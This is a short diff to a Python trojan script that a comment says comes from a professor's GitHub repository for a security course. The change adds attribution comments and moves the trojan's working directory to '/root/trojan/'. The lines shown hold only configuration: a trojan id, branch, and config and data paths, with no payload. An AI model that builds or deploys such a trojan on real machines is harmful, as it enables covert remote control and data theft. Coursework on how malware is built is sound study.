@@ -1,3 +1,7 @@
+#Trojan file, taken from Professor Rennick's Github repository
+#3/5/20 IAS299 
+# Tom Wentz
+
 import json
 import base64
 import sys
@@ -18,7 +22,7 @@ gh_repo = ''
 gh_branch = 'master'
 
 trojan_id = "abc"  # unique id for this trojan
-relative_path = "IAS299/trojan/"
+relative_path = "/root/trojan/"
 trojan_config = relative_path + "config/{0}.json".format(trojan_id)
 data_path = relative_path + "data/{0}/".format(trojan_id)
 trojan_modules = []
